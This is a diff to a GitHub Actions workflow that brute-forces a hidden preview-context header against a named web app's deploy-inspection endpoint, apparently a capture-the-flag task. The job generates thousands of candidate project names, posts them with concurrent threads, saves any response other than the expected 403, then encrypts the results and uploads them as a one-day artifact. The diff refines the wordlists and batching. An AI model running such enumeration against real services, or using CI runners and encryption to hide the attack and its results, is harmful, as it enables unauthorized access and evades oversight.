@@ -10,9 +10,9 @@ permissions:
 jobs:
   probe:
     runs-on: ubuntu-latest
-    timeout-minutes: 5
+    timeout-minutes: 3
     steps:
-      - name: Enumerate structured preview context names and encrypt hits
+      - name: Probe prioritized preview contexts in small batches
         shell: bash
         run: |
           set -euo pipefail
@@ -33,46 +33,40 @@ jobs:
           import requests,pathlib,urllib.parse,json,itertools,concurrent.futures
           base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
           out=pathlib.Path('package/out'); seed=requests.Session(); seed.headers['User-Agent']='Mozilla/5.0'
-          boot=seed.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=10).json(); refs=seed.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=10).json(); act=refs['serverActions']['inspectDeploy']; url=urllib.parse.urljoin(base,act['endpoint'])
-          body={'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}}
-          baseh={'Accept':'application/json','Content-Type':'application/json','User-Agent':'Mozilla/5.0'}
+          boot=seed.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=8).json(); refs=seed.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=8).json(); act=refs['serverActions']['inspectDeploy']; url=urllib.parse.urljoin(base,act['endpoint'])
+          body={'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}}; baseh={'Accept':'application/json','Content-Type':'application/json','User-Agent':'Mozilla/5.0'}
           public=boot['project']
-          words=['demo','board','release','pulse','production','readiness','enterprise','rollout','final','review','preview','deploy','deployment','internal','corporate','corp','admin','ops','operator','staging','stage','prod','product','publish','publisher','artifact','artifacts','control','plane','studio','team','releasepulse','release-pulse','production-readiness','enterprise-rollout','final-review','launch','live','candidate','rc3','2026']
-          cands={public}
-          # Most likely Launchlet project names: launchlet-<1..3 semantic parts>
-          atoms=words
-          for n in [1,2,3]:
-            for tup in itertools.product(atoms, repeat=n):
-              # prune duplicate adjacent words and nonsensical all numeric
-              if any(tup[i]==tup[i+1] for i in range(len(tup)-1)): continue
-              joined='-'.join(tup)
-              cands.add('launchlet-'+joined)
-              if n<=2:
-                cands.add(joined)
-                cands.add('project-'+joined)
-          # Variants around known public project and UI phrases.
-          bases=[public,'launchlet-demo','launchlet-release-pulse','launchlet-production-readiness','launchlet-enterprise-rollout','launchlet-final-review','release-pulse','production-readiness','enterprise-rollout','final-review']
-          tails=['release','deploy','prod','production','enterprise','internal','staging','final','review','admin','ops','2026','rc3','v1','v2','private','corp','corporate']
-          for b,t in itertools.product(bases,tails):
-            cands.add(b+'-'+t); cands.add(t+'-'+b)
-          # compact variants
-          extra=list(cands)
-          for c in extra[:5000]:
-            cands.add(c.replace('-','_'))
-          cands.discard(public)
-          # cap workload: prioritize launchlet names and UI-derived phrases, then others deterministically
-          ordered=sorted(cands,key=lambda x:(0 if x.startswith('launchlet-') else 1,len(x),x))[:30000]
+          heads=['launchlet','launchlet-demo','launchlet-release','launchlet-prod','launchlet-production','launchlet-enterprise','launchlet-internal','launchlet-corporate','launchlet-corp','launchlet-admin','launchlet-ops','launchlet-operator','launchlet-security','launchlet-build','launchlet-deploy','launchlet-deployment','launchlet-preview','launchlet-product','launchlet-platform','launchlet-control','launchlet-control-plane','launchlet-release-pulse','launchlet-production-readiness','launchlet-final-review','release-pulse','production-readiness','enterprise-rollout','final-review']
+          tails=['board','app','project','portal','console','tool','service','runner','control','plane','deploy','deployment','release','rollout','production','prod','enterprise','internal','private','admin','ops','operator','staging','stage','final','review','readiness','pulse','artifact','export','dispatcher','publish','publisher','security','team','studio','live','preview','candidate','rc3','2026','corporate','corp']
+          c=[]
+          def add(x):
+            if x!=public and x not in c:c.append(x)
+          # Direct strongest phrases first.
+          for x in ['launchlet-enterprise-rollout','launchlet-release-pulse','launchlet-production-readiness','launchlet-final-review','launchlet-enterprise-release','launchlet-enterprise-deploy','launchlet-production-release','launchlet-production-deploy','launchlet-internal-release','launchlet-internal-deploy','launchlet-release-board','launchlet-deploy-board','launchlet-prod-board','launchlet-enterprise-board','launchlet-release-pulse-board','launchlet-production-readiness-board','launchlet-final-review-board','enterprise-rollout','release-pulse','production-readiness','final-review']:
+            add(x)
+          for h,t in itertools.product(heads,tails): add(h+'-'+t)
+          # Three-part names, semantically centered around enterprise/release/production/deploy.
+          mids=['enterprise','release','production','prod','deploy','deployment','internal','corporate','final','review','rollout','preview','product','control','ops']
+          ends=['board','release','deploy','deployment','rollout','production','prod','internal','admin','ops','final','review','readiness','pulse','export','artifact','service','tool','portal','console']
+          for m,e in itertools.product(mids,ends):
+            add('launchlet-'+m+'-'+e); add('launchlet-demo-'+m+'-'+e); add('launchlet-'+m+'-demo-'+e)
+          # A few underscore variants.
+          for x in list(c)[:1200]: add(x.replace('-','_'))
+          c=c[:5500]
           def probe(v):
             try:
-              r=requests.post(url,headers={**baseh,'X-Launchlet-Preview':v},json=body,timeout=4,allow_redirects=False)
-              if r.status_code!=403 or r.text.strip()!='{"error":"preview_context_required"}':
-                return {'value':v,'status':r.status_code,'body':r.text,'headers':dict(r.headers)}
+              r=requests.post(url,headers={**baseh,'X-Launchlet-Preview':v},json=body,timeout=3,allow_redirects=False)
+              if r.status_code!=403 or r.text.strip()!='{"error":"preview_context_required"}': return {'value':v,'status':r.status_code,'body':r.text,'headers':dict(r.headers)}
             except Exception: pass
-          hits=[]
-          with concurrent.futures.ThreadPoolExecutor(max_workers=48) as ex:
-            for x in ex.map(probe,ordered,chunksize=20):
-              if x: hits.append(x)
-          (out/'summary.json').write_text(json.dumps({'candidate_count':len(ordered),'hits':hits},indent=2))
+          hits=[]; checked=0
+          for start in range(0,len(c),250):
+            batch=c[start:start+250]
+            with concurrent.futures.ThreadPoolExecutor(max_workers=12) as ex:
+              for x in ex.map(probe,batch):
+                checked+=1
+                if x:hits.append(x)
+            if hits: break
+          (out/'summary.json').write_text(json.dumps({'candidate_count':len(c),'checked':checked,'hits':hits},indent=2))
           PY
           tar -C package/out -czf package/result.tgz .
           openssl rand 32 > package/aes.key
@@ -88,6 +82,6 @@ jobs:
           rm -rf package
       - uses: actions/upload-artifact@v4
         with:
-          name: launchlet-part2-context-enum-encrypted
+          name: launchlet-part2-context-priority-encrypted
           path: artifact/
           retention-days: 1
